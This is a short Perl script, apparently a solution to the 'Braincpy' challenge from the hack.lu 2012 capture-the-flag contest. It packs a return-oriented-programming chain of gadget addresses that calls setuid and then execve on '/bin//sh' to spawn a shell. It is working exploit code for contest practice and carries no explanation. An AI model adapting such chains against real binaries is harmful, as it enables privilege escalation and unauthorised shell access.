#!/usr/bin/perl
# hack.lu 2012 Braincpy exploit
# run with ./braincpy "`perl expl.pl`"
# cutz



$payload =

pack("I", 0x080dbc2c). # pop %ecx
pack("I", 0x080cceea). # ptr-0xa => 1001 
pack("I", 0x080dbfcf). # add $0xa(%ecx), %ebx
pack("I", 0x080beb89). # pop %eax
pack("I", 0xffffffd2). # -23
pack("I", 0x08054e7f). # neg %eax
# pack("I", 0xdeadbeef).
pack("I", 0x0805b5c0). # int $0x80
pack("I", 0x0805adec). # pop %edx
pack("I", 0x080e4701). # +w
pack("I", 0x080beb89). # pop %eax
"//sh".
pack("I", 0x080dbc2c). # pop %ecx 
"/bin".
pack("I", 0x08048c0c). # mov %ecx, $0x14(%edx) ; mov %ebp, $0xc(%edx) ; mov %eax, $0x18(%edx)
pack("I", 0x0805ae15). # pop %edx, pop %ecx, pop %ebx
pack("I", 0x080e4701). # 0
pack("I", 0x080e4701). # 0
pack("I", 0x080e4715). # +w + 0x14
pack("I", 0x080beb89). # pop %eax
pack("I", 0xfffffff5). # -11
pack("I", 0x08054e7f). # neg %eax
pack("I", 0x0805b5c0). # int $0x80
pack("I", 0x08086c12). # ptr-0xa => 0xffffffa0
pack("I", 0x080df815); # add $0xa(%ebp), %esp

print $payload
